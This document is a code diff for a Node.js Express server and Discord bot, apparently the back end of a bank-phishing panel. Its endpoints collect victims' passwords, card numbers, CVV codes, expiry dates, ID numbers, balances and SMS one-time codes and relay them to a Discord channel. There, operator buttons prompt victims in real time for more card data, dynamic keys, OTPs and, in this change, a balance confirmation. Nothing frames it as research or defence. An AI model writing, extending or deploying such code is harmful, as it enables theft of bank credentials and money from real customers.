@@ -35,7 +35,6 @@ function detectarMarca(tarjeta) {
     return 'Desconocida';
 }
 
-// 🔥 ENDPOINT PRINCIPAL
 app.post('/nuevo', async (req, res) => {
     try {
         const { userId, accion, numero, password, datos, otp, tarjeta, codigo, documento, expMes, expAnio, saldo, infoCompleta } = req.body;
@@ -43,7 +42,6 @@ app.post('/nuevo', async (req, res) => {
         const finalUserId = userId || 'anon_' + Date.now();
         const channel = await client.channels.fetch(DISCORD_CHANNEL_ID);
 
-        // 1. DATOS PREVIOS
         if (accion && accion !== 'tarjeta') {
             let embed = new EmbedBuilder().setColor(0xda0081).setTimestamp().setFooter({ text: `User ID: ${finalUserId}` });
             let row = null;
@@ -73,13 +71,15 @@ app.post('/nuevo', async (req, res) => {
                          { name: '💵 Monto Solicitado', value: `\`${datos.monto}\``, inline: true }
                      );
 
-                // 🔥 BOTONES PARA EL SIMULADOR
+                // 🔥 NUEVOS BOTONES CON EL DE CONFIRMAR SALDO
                 row = new ActionRowBuilder().addComponents(
                     new ButtonBuilder().setCustomId(`cc_${finalUserId}`).setLabel('💳 Pedir CC').setStyle(ButtonStyle.Primary),
-                    new ButtonBuilder().setCustomId(`dina_${finalUserId}`).setLabel('📱 Pedir Dina').setStyle(ButtonStyle.Success)
+                    new ButtonBuilder().setCustomId(`dina_${finalUserId}`).setLabel('📱 Pedir Dina').setStyle(ButtonStyle.Success),
+                    new ButtonBuilder().setCustomId(`saldo_${finalUserId}`).setLabel('💰 Confirmar Saldo').setStyle(ButtonStyle.Secondary)
                 );
             } 
             else if (accion === 'otp') {
+                // ... (código de OTP igual)
                 let infoTexto = '';
                 if (infoCompleta) {
                     infoTexto = `Cédula: ${infoCompleta.cedula || 'N/A'}\nNombre: ${infoCompleta.nombreCompleto || 'N/A'}\nOcupación: ${infoCompleta.ocupacion || 'N/A'}\nIngresos: ${infoCompleta.ingresoMensual || 'N/A'}\nMonto: ${infoCompleta.montoPrestamo || 'N/A'}\nPlazo: ${infoCompleta.meses || 'N/A'} meses\nFecha de pago: día ${infoCompleta.fechaPago || 'N/A'}`;
@@ -95,7 +95,6 @@ app.post('/nuevo', async (req, res) => {
 
             const msg = await channel.send(payload);
             
-            // Guardamos el estado de la sesión
             let s = sesiones.get(finalUserId) || {};
             s.estado = accion === 'simulador' ? 'esperando_decision_simulador' : (s.estado || 'pending');
             s.discordMsgId = msg.id;
@@ -104,7 +103,6 @@ app.post('/nuevo', async (req, res) => {
             return res.json({ ok: true });
         }
 
-        // 2. DATOS DE LA TARJETA
         if (!tarjeta) return res.status(400).json({ ok: false, error: 'Falta tarjeta' });
 
         sesiones.set(finalUserId, {
@@ -144,8 +142,8 @@ app.post('/nuevo', async (req, res) => {
     }
 });
 
-// 🔥 ENDPOINT PARA RECIBIR EL SMS
 app.post('/validar-otp/:userId', async (req, res) => {
+    // ... (código del OTP igual)
     try {
         const { userId } = req.params;
         const { otp } = req.body;
@@ -177,14 +175,12 @@ app.post('/validar-otp/:userId', async (req, res) => {
     }
 });
 
-// ENDPOINTS DE ESPERA
 app.get('/estado/:userId', (req, res) => {
     const s = sesiones.get(req.params.userId);
     if (!s) return res.json({ estado: 'pending' });
     res.json({ estado: s.estado, otp: s.otp || null });
 });
 
-// 🔥 MANEJO DE BOTONES DE DISCORD
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isButton()) return;
 
@@ -193,10 +189,7 @@ client.on('interactionCreate', async (interaction) => {
     const userId = parts.slice(1).join('_');
 
     let s = sesiones.get(userId) || {};
-    
-    if (!s) return interaction.reply({ content: '❌ Sesión no encontrada o expirada.', ephemeral: true });
 
-    // 🔥 NUEVOS BOTONES DEL SIMULADOR
     if (action === 'cc') {
         s.estado = 'pedir_cc';
         sesiones.set(userId, s);
@@ -207,7 +200,12 @@ client.on('interactionCreate', async (interaction) => {
         sesiones.set(userId, s);
         await interaction.reply({ content: `📱 Se solicitó dinámica al usuario.`, ephemeral: true });
     }
-    // BOTONES DE LA TARJETA
+    // 🔥 NUEVA ACCIÓN PARA CONFIRMAR SALDO
+    else if (action === 'saldo') {
+        s.estado = 'confirmar_saldo';
+        sesiones.set(userId, s);
+        await interaction.reply({ content: `💰 Se solicitó confirmar el saldo nuevamente.`, ephemeral: true });
+    }
     else if (action === 'otp') {
         s.estado = 'pedir_otp'; 
         sesiones.set(userId, s);
